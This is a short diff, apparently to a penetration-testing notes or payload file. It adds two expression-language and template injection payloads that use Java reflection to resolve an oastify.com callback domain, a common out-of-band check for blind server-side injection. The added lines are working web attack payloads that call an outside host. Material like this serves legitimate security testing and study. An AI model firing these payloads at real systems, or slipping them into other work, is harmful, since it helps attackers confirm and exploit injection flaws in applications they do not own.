@@ -246,5 +246,7 @@ We are root.
 
 Aa2
 ```
-{{'a'.toUpperCase()}}
+${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","8fore14cxg51nrq3fcl98ruuzl5bt0.oastify.com")}
+
+${{"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","8fore14cxg51nrq3fcl98ruuzl5bt0.oastify.com")}}
 ```
